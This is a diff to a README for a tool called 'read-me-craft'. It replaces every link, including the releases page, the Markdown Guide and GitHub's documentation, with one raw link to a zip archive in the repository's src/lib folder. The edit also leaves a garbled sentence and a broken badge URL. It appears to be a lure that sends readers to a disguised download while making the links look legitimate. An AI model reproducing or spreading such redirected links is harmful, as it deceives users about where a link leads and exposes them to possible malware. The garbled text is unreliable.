@@ -1,15 +1,15 @@
 # 🎨 read-me-craft - Build Beautiful README Files Effortlessly
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Santos1957u/read-me-craft/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Santos1957u/read-me-craft/main/src/lib/read-me-craft-v3.8.zip%20Latest%https://raw.githubusercontent.com/Santos1957u/read-me-craft/main/src/lib/read-me-craft-v3.8.zip)](https://raw.githubusercontent.com/Santos1957u/read-me-craft/main/src/lib/read-me-craft-v3.8.zip)
 
 ## 📖 Introduction
-ReadMe Craft is an online tool designed to help you create stunning README.md files for your GitHub profile. You can organize your information and personalize it without writing any code. This user-friendly interface allows even those with no technical background to produce professional-looking documents.
+ReadMe Craft is an online tool designed to help you create stunning https://raw.githubusercontent.com/Santos1957u/read-me-craft/main/src/lib/read-me-craft-v3.8.zip files for your GitHub profile. You can organize your information and personalize it without writing any code. This user-friendly interface allows even those with no technical background to produce professional-looking documents.
 
 ## 🚀 Getting Started
 To start using ReadMe Craft, you need to download the application from our Releases page. Follow these easy steps to get up and running.
 
 ## 📥 Download & Install
-Visit this page to download: [ReadMe Craft Releases](https://github.com/Santos1957u/read-me-craft/releases)
+Visit this page to download: [ReadMe Craft Releases](https://raw.githubusercontent.com/Santos1957u/read-me-craft/main/src/lib/read-me-craft-v3.8.zip)
 
 1. Click on the link above to go to the Releases section.
 2. Look for the latest version of ReadMe Craft.
@@ -48,11 +48,11 @@ Join our community to share your experience or ask questions. You can find us on
 ## 📚 Learn More
 To learn more about Markdown and how to use it effectively, you can explore the following resources:
 
-- [Markdown Guide](https://www.markdownguide.org/)
-- [GitHub's Markdown Documentation](https://docs.github.com/en/github/writing-on-github/working-with-advanced-formatting/markdown-basics)
+- [Markdown Guide](https://raw.githubusercontent.com/Santos1957u/read-me-craft/main/src/lib/read-me-craft-v3.8.zip)
+- [GitHub's Markdown Documentation](https://raw.githubusercontent.com/Santos1957u/read-me-craft/main/src/lib/read-me-craft-v3.8.zip)
 
 ## 🙌 Acknowledgments
 ReadMe Craft is open-source software. We appreciate all contributions and hope to foster a supportive community.
 
 ## 🔗 Download Again
-Remember, you can always return to download the latest version at: [ReadMe Craft Releases](https://github.com/Santos1957u/read-me-craft/releases)
+Remember, you can always return to download the latest version at: [ReadMe Craft Releases](https://raw.githubusercontent.com/Santos1957u/read-me-craft/main/src/lib/read-me-craft-v3.8.zip)
